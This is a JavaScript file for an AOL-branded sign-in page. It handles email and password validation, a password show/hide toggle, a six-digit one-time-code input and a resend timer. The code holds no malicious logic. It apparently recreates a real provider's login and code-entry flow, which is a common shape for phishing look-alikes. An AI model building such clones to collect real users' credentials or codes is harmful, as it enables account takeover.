// script.js — AOL Sign-in Client JS

document.addEventListener('DOMContentLoaded', function () {

    /* ══ EMAIL FORM ══ */
    const emailForm  = document.getElementById('emailForm');
    const emailInput = document.getElementById('emailInput');
    const emailErr   = document.getElementById('emailErr');

    if (emailForm && emailInput) {
        emailInput.focus();
        emailForm.addEventListener('submit', function (e) {
            const val = emailInput.value.trim();
            if (!val) {
                e.preventDefault();
                if (emailErr) emailErr.textContent = 'Whoops, something went wrong.';
                emailInput.classList.add('err');
                document.querySelector('.field-label')?.classList.add('err-label');
            }
        });
        emailInput.addEventListener('input', function () {
            if (emailErr) emailErr.textContent = '';
            emailInput.classList.remove('err');
            document.querySelector('.field-label')?.classList.remove('err-label');
        });
    }

    /* ══ PASSWORD SHOW/HIDE ══ */
    const pwInput = document.getElementById('pwInput');
    const eyeBtn  = document.getElementById('eyeBtn');
    const eyeShow = document.getElementById('eyeShow');
    const eyeHide = document.getElementById('eyeHide');
    const pwErr   = document.getElementById('pwErr');
    const pwForm  = document.getElementById('pwForm');

    function setPwVisible(show) {
        if (!pwInput) return;
        pwInput.type = show ? 'text' : 'password';
        if (eyeShow) eyeShow.style.display = show ? 'none'   : 'inline';
        if (eyeHide) eyeHide.style.display = show ? 'inline' : 'none';
    }
    if (eyeBtn) {
        eyeBtn.addEventListener('click', function (e) {
            e.preventDefault();
            setPwVisible(pwInput.type !== 'text');
            pwInput.focus();
        });
    }
    if (pwForm && pwInput) {
        pwInput.focus();
        pwForm.addEventListener('submit', function (e) {
            if (!pwInput.value) {
                e.preventDefault();
                if (pwErr) pwErr.textContent = 'Invalid password. Please try again';
                pwInput.classList.add('err');
            }
        });
        pwInput.addEventListener('input', function () {
            if (pwErr) pwErr.textContent = '';
            pwInput.classList.remove('err');
        });
    }

    /* ══ OTP 6-BOX INPUT ══ */
    const otpWrap   = document.getElementById('otpWrap');
    const hiddenCode = document.getElementById('hiddenCode');
    const submitBtn  = document.getElementById('submitBtn');
    const codeErr    = document.getElementById('codeErr');

    if (otpWrap) {
        const boxes = Array.from(otpWrap.querySelectorAll('.otp-box'));

        function syncCode() {
            const code = boxes.map(b => b.value).join('');
            if (hiddenCode) hiddenCode.value = code;
            // Enable Next button only when all 6 digits filled
            if (submitBtn) submitBtn.disabled = code.length < 6;
        }

        boxes.forEach(function (box, idx) {
            // Allow only digits
            box.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && !box.value && idx > 0) {
                    boxes[idx - 1].focus();
                    boxes[idx - 1].value = '';
                    syncCode();
                }
            });
            box.addEventListener('input', function () {
                // Strip non-digits
                box.value = box.value.replace(/\D/g, '').slice(-1);
                syncCode();
                if (box.value && idx < boxes.length - 1) {
                    boxes[idx + 1].focus();
                }
                if (codeErr) codeErr.textContent = '';
            });
            // Handle paste on any box
            box.addEventListener('paste', function (e) {
                e.preventDefault();
                const pasted = (e.clipboardData || window.clipboardData)
                    .getData('text').replace(/\D/g, '').slice(0, 6);
                pasted.split('').forEach(function (ch, i) {
                    if (boxes[i]) boxes[i].value = ch;
                });
                syncCode();
                const next = Math.min(pasted.length, boxes.length - 1);
                boxes[next].focus();
            });
        });

        // Focus first box on load
        boxes[0]?.focus();
    }

    /* ══ RESEND COUNTDOWN TIMER ══ */
    const resendTimer = document.getElementById('resendTimer');
    if (resendTimer) {
        let total = 55; // seconds
        const tick = setInterval(function () {
            total--;
            if (total <= 0) {
                clearInterval(tick);
                resendTimer.innerHTML = '<a href="" class="aol-link" style="font-weight:600">Resend code</a>';
            } else {
                const m = Math.floor(total / 60);
                const s = total % 60;
                resendTimer.textContent = 'Resend code in ' + m + ':' + String(s).padStart(2, '0');
            }
        }, 1000);
    }
});
